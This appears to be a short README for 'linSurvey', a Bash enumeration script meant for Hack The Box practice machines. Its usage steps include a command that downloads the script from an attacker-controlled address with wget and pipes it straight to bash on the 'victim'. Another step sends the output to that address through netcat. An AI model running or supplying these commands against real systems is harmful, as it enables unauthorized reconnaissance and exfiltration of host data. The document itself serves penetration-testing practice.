# linSurvey

GNU/Linux enumeration script written in BASH.<br>
Created to enumerate GNU/Linux machines on Hack The Box. Can possibly be used against UNIX machines.<br> 
Visuals taking from HIGH ON COFFEE'S enumeration script. 

HOW TO USE:
1. Upload script to victim:
   1. bash linSurvey.sh
   2. (as needed) bash linSurvey.sh | tee /tmp/linSurvey.txt
  
2. Use wget to piped to bash to run:
   1. wget YOUR_IP_ADDR/linSurvey.sh -O- | bash
   2. (as needed) wget YOUR_IP_ADDR/linSurvey.sh -O- | bash | nc -nvvq1 YOUR_IP_ADDR YOUR_PORT
      1. Have netcat on your attack machine listening for data: nc -nvvls YOUR_IP_ADDR -p YOUR_PORT > linSurvey.txt && cat linSurvey.txt
  
  Enjoy
